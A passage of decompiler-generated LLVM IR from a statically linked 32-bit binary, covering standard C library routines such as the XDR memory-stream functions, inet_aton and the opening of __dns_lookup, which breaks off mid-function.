  store i32 ptrtoint (i32* @global_var_10013b1c.535 to i32), i32* @lr, align 4
  %v0_10013b18 = call i32 @free()
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10013b24 = load i32, i32* @r27, align 4
  %v2_10013b24 = inttoptr i32 %v1_10013b24 to i32*
  store i32 0, i32* %v2_10013b24, align 4
  %v0_10013b48.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013b38

dec_label_pc_10013b2c:                            ; preds = %dec_label_pc_10013aa0, %dec_label_pc_10013a80, %entry, %dec_label_pc_10013ad4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013b38

dec_label_pc_10013b34:                            ; preds = %dec_label_pc_10013b0c, %dec_label_pc_10013aac
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013b38

dec_label_pc_10013b38:                            ; preds = %dec_label_pc_10013b2c, %dec_label_pc_10013b14, %dec_label_pc_10013b34
  %v0_10013b48 = phi i32 [ 0, %dec_label_pc_10013b2c ], [ %v0_10013b48.pre, %dec_label_pc_10013b14 ], [ 1, %dec_label_pc_10013b34 ]
  ret i32 %v0_10013b48

; uselistorder directives
  uselistorder i32 %v0_10013af0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 1, 8, 9, 0 }
  uselistorder i32 (i32*)* @xdr_opaque, { 1, 2, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10013b38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013b2c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10013b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10013aec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013a8c, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10013b54 = add i32 %arg1, 4
  %v4_10013b58 = inttoptr i32 %v1_10013b54 to i32*
  %v5_10013b58 = call i32 @xdr_bytes(i32* %v4_10013b58, i32 %arg1, i32 1024, i32 1024)
  ret i32 %v5_10013b58
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10013b60 = add i32 %tmp, 20
  %v3_10013b60 = inttoptr i32 %v2_10013b60 to i32*
  store i32 %arg3, i32* %v3_10013b60, align 4
  store i32 %arg4, i32* %arg1, align 4
  %v2_10013b6c = add i32 %tmp, 4
  %v3_10013b6c = inttoptr i32 %v2_10013b6c to i32*
  store i32 ptrtoint (i32* @global_var_1001a070.536 to i32), i32* %v3_10013b6c, align 4
  %v2_10013b70 = add i32 %tmp, 12
  %v3_10013b70 = inttoptr i32 %v2_10013b70 to i32*
  store i32 %arg2, i32* %v3_10013b70, align 4
  %v2_10013b74 = add i32 %tmp, 16
  %v3_10013b74 = inttoptr i32 %v2_10013b74 to i32*
  store i32 %arg2, i32* %v3_10013b74, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 3, 0, 2, 1, 4 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v0_10013b7c = load i32, i32* @r3, align 4
  ret i32 %v0_10013b7c
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10013b80 = add i32 %arg1, 20
  %v2_10013b80 = inttoptr i32 %v1_10013b80 to i32*
  %v3_10013b80 = load i32, i32* %v2_10013b80, align 4
  store i32 %v3_10013b80, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10013b80, 4
  br i1 %tmp2, label %dec_label_pc_10013bb4, label %dec_label_pc_10013b94

dec_label_pc_10013b94:                            ; preds = %entry
  %v1_10013b8c = add i32 %v3_10013b80, -4
  %v1_10013b94 = add i32 %arg1, 12
  %v2_10013b94 = inttoptr i32 %v1_10013b94 to i32*
  %v3_10013b94 = load i32, i32* %v2_10013b94, align 4
  store i32 %v3_10013b94, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v1_10013b8c, i32* %v2_10013b80, align 4
  %v0_10013ba0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ba0 = inttoptr i32 %v0_10013ba0 to i32*
  %v2_10013ba0 = load i32, i32* %v1_10013ba0, align 4
  store i32 %v2_10013ba0, i32* %arg2, align 4
  %v3_10013ba8 = load i32, i32* %v2_10013b94, align 4
  %v1_10013bac = add i32 %v3_10013ba8, 4
  store i32 %v1_10013bac, i32* %r9.global-to-local, align 4
  store i32 %v1_10013bac, i32* %v2_10013b94, align 4
  %v0_10013bb4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013bb4

dec_label_pc_10013bb4:                            ; preds = %entry, %dec_label_pc_10013b94
  %v0_10013bb4 = phi i32 [ 0, %entry ], [ %v0_10013bb4.pre, %dec_label_pc_10013b94 ]
  ret i32 %v0_10013bb4

; uselistorder directives
  uselistorder i32* %v2_10013b94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013bb4, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10013bbc = add i32 %arg1, 20
  %v2_10013bbc = inttoptr i32 %v1_10013bbc to i32*
  %v3_10013bbc = load i32, i32* %v2_10013bbc, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10013bbc, 4
  br i1 %tmp2, label %dec_label_pc_10013bf0, label %dec_label_pc_10013bd0

dec_label_pc_10013bd0:                            ; preds = %entry
  %v1_10013bc8 = add i32 %v3_10013bbc, -4
  store i32 %v1_10013bc8, i32* %v2_10013bbc, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10013bd8 = add i32 %arg1, 12
  %v2_10013bd8 = inttoptr i32 %v1_10013bd8 to i32*
  %v3_10013bd8 = load i32, i32* %v2_10013bd8, align 4
  %v2_10013bdc = load i32, i32* %arg2, align 4
  %v2_10013be0 = inttoptr i32 %v3_10013bd8 to i32*
  store i32 %v2_10013bdc, i32* %v2_10013be0, align 4
  %v3_10013be4 = load i32, i32* %v2_10013bd8, align 4
  %v1_10013be8 = add i32 %v3_10013be4, 4
  store i32 %v1_10013be8, i32* %v2_10013bd8, align 4
  %v0_10013bf0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013bf0

dec_label_pc_10013bf0:                            ; preds = %entry, %dec_label_pc_10013bd0
  %v0_10013bf0 = phi i32 [ 0, %entry ], [ %v0_10013bf0.pre, %dec_label_pc_10013bd0 ]
  ret i32 %v0_10013bf0

; uselistorder directives
  uselistorder i32* %v2_10013bd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013bf0, { 1, 0 }
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10013bf8 = add i32 %arg1, 16
  %v2_10013bf8 = inttoptr i32 %v1_10013bf8 to i32*
  %v3_10013bf8 = load i32, i32* %v2_10013bf8, align 4
  %v1_10013bfc = add i32 %arg1, 12
  %v2_10013bfc = inttoptr i32 %v1_10013bfc to i32*
  %v3_10013bfc = load i32, i32* %v2_10013bfc, align 4
  %v2_10013c00 = sub i32 %v3_10013bfc, %v3_10013bf8
  ret i32 %v2_10013c00
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_10013c08 = add i32 %arg1, 20
  %v2_10013c08 = inttoptr i32 %v1_10013c08 to i32*
  %v3_10013c08 = load i32, i32* %v2_10013c08, align 4
  store i32 %v3_10013c08, i32* %r9.global-to-local, align 4
  %v1_10013c0c = add i32 %arg1, 12
  %v2_10013c0c = inttoptr i32 %v1_10013c0c to i32*
  %v3_10013c0c = load i32, i32* %v2_10013c0c, align 4
  %v1_10013c10 = add i32 %arg1, 16
  %v2_10013c10 = inttoptr i32 %v1_10013c10 to i32*
  %v3_10013c10 = load i32, i32* %v2_10013c10, align 4
  %v2_10013c14 = add i32 %v3_10013c0c, %v3_10013c08
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10013c1c = add i32 %v3_10013c10, %arg2
  store i32 %v2_10013c1c, i32* %r4.global-to-local, align 4
  %v3_10013c20 = icmp slt i32 %v2_10013c14, %v2_10013c1c
  br i1 %v3_10013c20, label %dec_label_pc_10013c38, label %dec_label_pc_10013c2c

dec_label_pc_10013c2c:                            ; preds = %entry
  %v2_10013c24 = sub i32 %v2_10013c14, %v2_10013c1c
  store i32 %v2_10013c24, i32* %v2_10013c08, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  %v0_10013c34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10013c34, i32* %v2_10013c0c, align 4
  %v0_10013c38.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013c38

dec_label_pc_10013c38:                            ; preds = %entry, %dec_label_pc_10013c2c
  %v0_10013c38 = phi i32 [ 0, %entry ], [ %v0_10013c38.pre, %dec_label_pc_10013c2c ]
  ret i32 %v0_10013c38

; uselistorder directives
  uselistorder i32 %v2_10013c1c, { 1, 0, 2 }
  uselistorder i32 %v2_10013c14, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10013c38, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v1_10013c40 = add i32 %arg1, 20
  %v2_10013c40 = inttoptr i32 %v1_10013c40 to i32*
  %v3_10013c40 = load i32, i32* %v2_10013c40, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10013c48 = icmp ult i32 %v3_10013c40, %arg2
  br i1 %v2_10013c48, label %dec_label_pc_10013c64, label %dec_label_pc_10013c54

dec_label_pc_10013c54:                            ; preds = %entry
  %v2_10013c4c = sub i32 %v3_10013c40, %arg2
  %v1_10013c54 = add i32 %arg1, 12
  %v2_10013c54 = inttoptr i32 %v1_10013c54 to i32*
  %v3_10013c54 = load i32, i32* %v2_10013c54, align 4
  store i32 %v3_10013c54, i32* %r9.global-to-local, align 4
  store i32 %v2_10013c4c, i32* %v2_10013c40, align 4
  %v0_10013c5c = load i32, i32* %r9.global-to-local, align 4
  %v2_10013c5c = add i32 %v0_10013c5c, %arg2
  store i32 %v2_10013c5c, i32* %v2_10013c54, align 4
  %v0_10013c64.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013c64

dec_label_pc_10013c64:                            ; preds = %entry, %dec_label_pc_10013c54
  %v0_10013c64 = phi i32 [ 0, %entry ], [ %v0_10013c64.pre, %dec_label_pc_10013c54 ]
  ret i32 %v0_10013c64

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10013c64, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10013c6c = add i32 %arg1, 20
  %v2_10013c6c = inttoptr i32 %v1_10013c6c to i32*
  %v3_10013c6c = load i32, i32* %v2_10013c6c, align 4
  store i32 %v3_10013c6c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10013c6c, 4
  br i1 %tmp2, label %dec_label_pc_10013ca0, label %dec_label_pc_10013c80

dec_label_pc_10013c80:                            ; preds = %entry
  %v1_10013c78 = add i32 %v3_10013c6c, -4
  %v1_10013c80 = add i32 %arg1, 12
  %v2_10013c80 = inttoptr i32 %v1_10013c80 to i32*
  %v3_10013c80 = load i32, i32* %v2_10013c80, align 4
  store i32 %v3_10013c80, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v1_10013c78, i32* %v2_10013c6c, align 4
  %v0_10013c8c = load i32, i32* %r9.global-to-local, align 4
  %v1_10013c8c = inttoptr i32 %v0_10013c8c to i32*
  %v2_10013c8c = load i32, i32* %v1_10013c8c, align 4
  store i32 %v2_10013c8c, i32* %arg2, align 4
  %v3_10013c94 = load i32, i32* %v2_10013c80, align 4
  %v1_10013c98 = add i32 %v3_10013c94, 4
  store i32 %v1_10013c98, i32* %r9.global-to-local, align 4
  store i32 %v1_10013c98, i32* %v2_10013c80, align 4
  %v0_10013ca0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013ca0

dec_label_pc_10013ca0:                            ; preds = %entry, %dec_label_pc_10013c80
  %v0_10013ca0 = phi i32 [ 0, %entry ], [ %v0_10013ca0.pre, %dec_label_pc_10013c80 ]
  ret i32 %v0_10013ca0

; uselistorder directives
  uselistorder i32* %v2_10013c80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013ca0, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10013ca8 = add i32 %arg1, 20
  %v2_10013ca8 = inttoptr i32 %v1_10013ca8 to i32*
  %v3_10013ca8 = load i32, i32* %v2_10013ca8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10013ca8, 4
  br i1 %tmp2, label %dec_label_pc_10013cdc, label %dec_label_pc_10013cbc

dec_label_pc_10013cbc:                            ; preds = %entry
  %v1_10013cb4 = add i32 %v3_10013ca8, -4
  store i32 %v1_10013cb4, i32* %v2_10013ca8, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10013cc4 = add i32 %arg1, 12
  %v2_10013cc4 = inttoptr i32 %v1_10013cc4 to i32*
  %v3_10013cc4 = load i32, i32* %v2_10013cc4, align 4
  %v2_10013cc8 = load i32, i32* %arg2, align 4
  %v2_10013ccc = inttoptr i32 %v3_10013cc4 to i32*
  store i32 %v2_10013cc8, i32* %v2_10013ccc, align 4
  %v3_10013cd0 = load i32, i32* %v2_10013cc4, align 4
  %v1_10013cd4 = add i32 %v3_10013cd0, 4
  store i32 %v1_10013cd4, i32* %v2_10013cc4, align 4
  %v0_10013cdc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013cdc

dec_label_pc_10013cdc:                            ; preds = %entry, %dec_label_pc_10013cbc
  %v0_10013cdc = phi i32 [ 0, %entry ], [ %v0_10013cdc.pre, %dec_label_pc_10013cbc ]
  ret i32 %v0_10013cdc

; uselistorder directives
  uselistorder i32* %v2_10013cc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013cdc, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* %r30.global-to-local, align 4
  %v1_10013cfc = add i32 %arg1, 20
  %v2_10013cfc = inttoptr i32 %v1_10013cfc to i32*
  %v3_10013cfc = load i32, i32* %v2_10013cfc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10013d04 = icmp ult i32 %v3_10013cfc, %arg2
  br i1 %v2_10013d04, label %dec_label_pc_10013d2c, label %dec_label_pc_10013d10

dec_label_pc_10013d10:                            ; preds = %entry
  %v2_10013d08 = sub i32 %v3_10013cfc, %arg2
  store i32 %v2_10013d08, i32* %v2_10013cfc, align 4
  %v0_10013d14 = load i32, i32* %r31.global-to-local, align 4
  %v1_10013d14 = add i32 %v0_10013d14, 12
  %v2_10013d14 = inttoptr i32 %v1_10013d14 to i32*
  %v3_10013d14 = load i32, i32* %v2_10013d14, align 4
  store i32 %v3_10013d14, i32* @r3, align 4
  store i32 268516636, i32* @lr, align 4
  %v0_10013d18 = call i32 @memcpy()
  store i32 %v0_10013d18, i32* %r3.global-to-local, align 4
  %v0_10013d1c = load i32, i32* %r31.global-to-local, align 4
  %v1_10013d1c = add i32 %v0_10013d1c, 12
  %v2_10013d1c = inttoptr i32 %v1_10013d1c to i32*
  %v3_10013d1c = load i32, i32* %v2_10013d1c, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10013d24 = load i32, i32* %r30.global-to-local, align 4
  %v2_10013d24 = add i32 %v1_10013d24, %v3_10013d1c
  store i32 %v2_10013d24, i32* %v2_10013d1c, align 4
  %v0_10013d3c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013d2c

dec_label_pc_10013d2c:                            ; preds = %entry, %dec_label_pc_10013d10
  %v0_10013d3c = phi i32 [ 0, %entry ], [ %v0_10013d3c.pre, %dec_label_pc_10013d10 ]
  ret i32 %v0_10013d3c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013d2c, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_10013d5c = add i32 %arg1, 20
  %v2_10013d5c = inttoptr i32 %v1_10013d5c to i32*
  %v3_10013d5c = load i32, i32* %v2_10013d5c, align 4
  store i32 %arg2, i32* @r3, align 4
  %v2_10013d64 = icmp ult i32 %v3_10013d5c, %arg3
  br i1 %v2_10013d64, label %dec_label_pc_10013d8c, label %dec_label_pc_10013d70

dec_label_pc_10013d70:                            ; preds = %entry
  %v2_10013d68 = sub i32 %v3_10013d5c, %arg3
  store i32 %v2_10013d68, i32* %v2_10013d5c, align 4
  %v0_10013d74 = load i32, i32* %r31.global-to-local, align 4
  %v1_10013d74 = add i32 %v0_10013d74, 12
  %v2_10013d74 = inttoptr i32 %v1_10013d74 to i32*
  %v3_10013d74 = load i32, i32* %v2_10013d74, align 4
  store i32 %v3_10013d74, i32* @r4, align 4
  store i32 268516732, i32* @lr, align 4
  %v0_10013d78 = call i32 @memcpy()
  %v0_10013d7c = load i32, i32* %r31.global-to-local, align 4
  %v1_10013d7c = add i32 %v0_10013d7c, 12
  %v2_10013d7c = inttoptr i32 %v1_10013d7c to i32*
  %v3_10013d7c = load i32, i32* %v2_10013d7c, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10013d84 = load i32, i32* %r30.global-to-local, align 4
  %v2_10013d84 = add i32 %v1_10013d84, %v3_10013d7c
  store i32 %v2_10013d84, i32* %v2_10013d7c, align 4
  %v0_10013d90.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013d8c

dec_label_pc_10013d8c:                            ; preds = %entry, %dec_label_pc_10013d70
  %v0_10013d90 = phi i32 [ 0, %entry ], [ %v0_10013d90.pre, %dec_label_pc_10013d70 ]
  ret i32 %v0_10013d90

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10013d8c, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_10013da4 = icmp eq i8* %arg1, null
  br i1 %v3_10013da4, label %dec_label_pc_10013e5c, label %dec_label_pc_10013dac

dec_label_pc_10013dac:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10013dc0.pre = load i32, i32* @global_var_1002efac, align 4
  br label %dec_label_pc_10013dbc

dec_label_pc_10013dbc:                            ; preds = %dec_label_pc_10013dac, %dec_label_pc_10013e34
  %v0_10013e34 = phi i32 [ 0, %dec_label_pc_10013dac ], [ %v2_10013e3c, %dec_label_pc_10013e34 ]
  %v0_10013e38 = phi i32 [ 1, %dec_label_pc_10013dac ], [ %v1_10013e38, %dec_label_pc_10013e34 ]
  %v0_10013dbc = phi i32 [ %tmp, %dec_label_pc_10013dac ], [ %v0_10013dbc3, %dec_label_pc_10013e34 ]
  %v1_10013dbc = inttoptr i32 %v0_10013dbc to i8*
  %v2_10013dbc = load i8, i8* %v1_10013dbc, align 1
  %v3_10013dbc = zext i8 %v2_10013dbc to i32
  %v1_10013dc4 = mul nuw nsw i32 %v3_10013dbc, 2
  %v2_10013dc8 = add i32 %v1_10013dc4, %v3_10013dc0.pre
  %v3_10013dc8 = inttoptr i32 %v2_10013dc8 to i16*
  %v4_10013dc8 = load i16, i16* %v3_10013dc8, align 2
  %v1_10013dcc = and i16 %v4_10013dc8, 8
  %v3_10013dcc = icmp eq i16 %v1_10013dcc, 0
  br i1 %v3_10013dcc, label %dec_label_pc_10013e5c, label %dec_label_pc_10013dd4

dec_label_pc_10013dd4:                            ; preds = %dec_label_pc_10013dbc
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10013dec

dec_label_pc_10013ddc:                            ; preds = %dec_label_pc_10013dec
  %v1_10013ddc = add i32 %v2_10013df8, -48
  store i32 %v1_10013ddc, i32* @r8, align 4
  %v1_10013de0 = add i32 %v0_10013e24, 1
  %v2_10013de4 = icmp sgt i32 %v1_10013ddc, 255
  br i1 %v2_10013de4, label %dec_label_pc_10013e5c, label %dec_label_pc_10013dec

dec_label_pc_10013dec:                            ; preds = %dec_label_pc_10013ddc, %dec_label_pc_10013dd4
  %v1_10013e3c = phi i32 [ %v1_10013ddc, %dec_label_pc_10013ddc ], [ 0, %dec_label_pc_10013dd4 ]
  %v0_10013e24 = phi i32 [ %v1_10013de0, %dec_label_pc_10013ddc ], [ %v0_10013dbc, %dec_label_pc_10013dd4 ]
  %v1_10013dec = inttoptr i32 %v0_10013e24 to i8*
  %v2_10013dec = load i8, i8* %v1_10013dec, align 1
  %v3_10013dec = zext i8 %v2_10013dec to i32
  %v1_10013df0 = mul i32 %v1_10013e3c, 10
  %v1_10013df4 = mul nuw nsw i32 %v3_10013dec, 2
  %v2_10013df8 = add i32 %v3_10013dec, %v1_10013df0
  store i32 %v2_10013df8, i32* @r10, align 4
  %v2_10013dfc = add i32 %v1_10013df4, %v3_10013dc0.pre
  %v3_10013dfc = inttoptr i32 %v2_10013dfc to i16*
  %v4_10013dfc = load i16, i16* %v3_10013dfc, align 2
  %v5_10013dfc = zext i16 %v4_10013dfc to i32
  %v1_10013e00 = and i32 %v5_10013dfc, 8
  %v3_10013e00 = icmp eq i32 %v1_10013e00, 0
  br i1 %v3_10013e00, label %dec_label_pc_10013e08, label %dec_label_pc_10013ddc

dec_label_pc_10013e08:                            ; preds = %dec_label_pc_10013dec
  %v2_10013e08 = icmp sgt i32 %v0_10013e38, 3
  br i1 %v2_10013e08, label %dec_label_pc_10013e20, label %dec_label_pc_10013e10

dec_label_pc_10013e10:                            ; preds = %dec_label_pc_10013e08
  %v3_10013e10 = icmp eq i8 %v2_10013dec, 46
  br i1 %v3_10013e10, label %dec_label_pc_10013e18, label %dec_label_pc_10013e5c

dec_label_pc_10013e18:                            ; preds = %dec_label_pc_10013e10
  %v1_10013e18 = add i32 %v0_10013e24, 1
  br label %dec_label_pc_10013e34

dec_label_pc_10013e20:                            ; preds = %dec_label_pc_10013e08
  %v3_10013e20 = icmp eq i8 %v2_10013dec, 0
  %v1_10013e24 = add i32 %v0_10013e24, 1
  br i1 %v3_10013e20, label %dec_label_pc_10013e34, label %dec_label_pc_10013e2c

dec_label_pc_10013e2c:                            ; preds = %dec_label_pc_10013e20
  %v1_10013e2c = and i32 %v5_10013dfc, 32
  %v3_10013e2c = icmp eq i32 %v1_10013e2c, 0
  br i1 %v3_10013e2c, label %dec_label_pc_10013e5c, label %dec_label_pc_10013e34

dec_label_pc_10013e34:                            ; preds = %dec_label_pc_10013e2c, %dec_label_pc_10013e20, %dec_label_pc_10013e18
  %v0_10013dbc3 = phi i32 [ %v1_10013e24, %dec_label_pc_10013e2c ], [ %v1_10013e24, %dec_label_pc_10013e20 ], [ %v1_10013e18, %dec_label_pc_10013e18 ]
  %v1_10013e34 = mul i32 %v0_10013e34, 256
  %v1_10013e38 = add nuw nsw i32 %v0_10013e38, 1
  %v2_10013e3c = or i32 %v1_10013e3c, %v1_10013e34
  store i32 %v2_10013e3c, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_10013e38, 5
  br i1 %tmp10, label %dec_label_pc_10013dbc, label %dec_label_pc_10013e48

dec_label_pc_10013e48:                            ; preds = %dec_label_pc_10013e34
  %v0_10013e48 = load i32, i32* @r4, align 4
  %v3_10013e48 = icmp eq i32 %v0_10013e48, 0
  %v0_10013e50 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10013e48, i32 %v0_10013e50)
  %v0_10013e54 = load i32, i32* %r5.global-to-local, align 4
  %v1_10013e54 = load i32, i32* @r4, align 4
  %v2_10013e54 = inttoptr i32 %v1_10013e54 to i32*
  store i32 %v0_10013e54, i32* %v2_10013e54, align 4
  ret i32 1

dec_label_pc_10013e5c:                            ; preds = %dec_label_pc_10013e10, %dec_label_pc_10013e2c, %dec_label_pc_10013dbc, %dec_label_pc_10013ddc, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10013e3c, { 1, 0 }
  uselistorder i32 %v1_10013e38, { 1, 0 }
  uselistorder i32 %v2_10013df8, { 1, 0 }
  uselistorder i32 %v3_10013dec, { 1, 0 }
  uselistorder i32 %v0_10013e24, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10013e5c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10013dbc, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10013e68 = load i32, i32* @lr, align 4
  store i32 %v0_10013e68, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* @r16, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268517012, i32* @lr, align 4
  %v0_10013e90 = call i32 @malloc()
  store i32 %v0_10013e90, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268517024, i32* @lr, align 4
  %v0_10013e9c = call i32 @malloc()
  %v0_10013ea0 = load i32, i32* @r30, align 4
  %v3_10013ea0 = icmp eq i32 %v0_10013ea0, 0
  store i32 %v0_10013e9c, i32* @r21, align 4
  br i1 %v3_10013ea0, label %dec_label_pc_1001445c, label %dec_label_pc_10013eac

dec_label_pc_10013eac:                            ; preds = %entry
  %v3_10013eac = icmp eq i32 %v0_10013e9c, 0
  br i1 %v3_10013eac, label %dec_label_pc_1001445c, label %dec_label_pc_10013eb4

dec_label_pc_10013eb4:                            ; preds = %dec_label_pc_10013eac
  %v0_10013eb4 = load i32, i32* @r23, align 4
  %v3_10013eb4 = icmp eq i32 %v0_10013eb4, 0
  br i1 %v3_10013eb4, label %dec_label_pc_1001445c, label %dec_label_pc_10013ebc

dec_label_pc_10013ebc:                            ; preds = %dec_label_pc_10013eb4
  %v0_10013ebc = load i32, i32* %r14.global-to-local, align 4
  %v1_10013ebc = inttoptr i32 %v0_10013ebc to i8*
  %v2_10013ebc = load i8, i8* %v1_10013ebc, align 1
  %v3_10013ebc = zext i8 %v2_10013ebc to i32
  store i32 %v3_10013ebc, i32* %r0.global-to-local, align 4
  %v3_10013ec0 = icmp eq i8 %v2_10013ebc, 0
  br i1 %v3_10013ec0, label %dec_label_pc_1001445c, label %dec_label_pc_10013ec8

dec_label_pc_10013ec8:                            ; preds = %dec_label_pc_10013ebc
  store i32 %v0_10013ebc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  %v0_10013ed0 = call i32 @__GI_strlen()
  %v0_10013ed8 = load i32, i32* %r14.global-to-local, align 4
